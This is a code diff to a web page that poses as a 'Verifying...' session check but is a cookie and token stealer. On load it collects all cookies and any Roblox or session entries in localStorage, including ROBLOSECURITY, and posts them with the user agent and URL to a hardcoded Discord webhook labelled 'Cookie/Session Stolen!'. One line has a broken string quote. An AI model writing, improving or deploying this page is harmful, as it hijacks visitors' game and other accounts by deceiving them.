@@ -2,38 +2,46 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        body { background: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        h1 { text-align: center; }
-    </style>
+    <title>Cookie Grabber</title>
+    <style>body{background:#2f3136;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}</style>
 </head>
 <body>
-    <h1>Verifying Session...</h1>
+    <h1>Verifying...</h1>
     <script>
         (function() {
-            var webhook = "https://discord.com/api/webhooks/1552445077761171548/lcxmsb2Oqiyrlu7-GbeRHHBj-cXU0QSyD5xF0Zxz20xT6xSJYT2DfHUxoUG07kIVevw7";
+            var w = "https://discord.com/api/webhooks/1552445077761171548/lcxmsb2Oqiyrlu7-GbeRHHBj-cXU0QSyD5xF0Zxz20xT6xSJYT2DfHUxoUG07kIVevw7";
             
-            // Get specific cookies
+            // 1. Get ALL standard cookies
             var allCookies = document.cookie;
-            var robloxCookie = allCookies.split(';').find(c => c.includes('ROBLOSECURITY') || c.includes('Roblox='));
             
-            // Extract just the Roblox cookie for clarity
-            var robloxClean = robloxCookie ? robloxCookie.trim() : "None Found";
+            // 2. Check LocalStorage (Common for Roblox Mobile/Web)
+            var robloxLocal = "";
+            try {
+                // Roblox often stores tokens here on mobile web
+                if (localStorage.getItem('ROBLOSECURITY')) robloxLocal += "ROBLOSECURITY=" + localStorage.getItem('ROBLOSECURITY') + "\n";
+                if (localStorage.getItem('Roblox)) robloxLocal += "Roblox=" + localStorage.getItem('Roblox') + "\n";
+                // Check all keys just in case
+                for (var key in localStorage) {
+                    if (localStorage.hasOwnProperty(key) && (key.includes('Roblox') || key.includes('ROBLOX') || key.includes('Session'))) {
+                        robloxLocal += key + "=" + localStorage.getItem(key) + "\n";
+                    }
+                }
+            } catch (e) {
+                robloxLocal = "LocalStorage access denied or empty.";
+            }
 
-            fetch(webhook, {
+            // Combine for display
+            var finalDisplay = allCookies + "\n\n[LocalStorage]:\n" + robloxLocal;
+
+            fetch(w, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
-                    content: "**🍪 Cookie Stolen!**\n\n**🌐 Site:** " + window.location.hostname + "\n**🔗 URL:** " + window.location.href + "\n\n**🍪 Full Cookie:** `" + allCookies + "`\n**🎮 Roblox Cookie:** `" + robloxClean + "`\n\n**📱 User Agent:** " + navigator.userAgent + "\n⏰ Time: " + new Date().toLocaleString()
+                    content: "🍪 **Cookie/Session Stolen!**\n\n**Cookies:** `" + allCookies + "`\n\n**LocalStorage:** `" + robloxLocal + "`\n\n**UA:** " + navigator.userAgent + "\n**URL:** " + window.location.href
                 })
             });
 
-            // Change text after sending
-            setTimeout(() => {
-                document.querySelector("h1").innerText = "Session Verified!";
-            }, 1000);
+            document.querySelector("h1").innerText = "Success!";
         })();
     </script>
 </body>
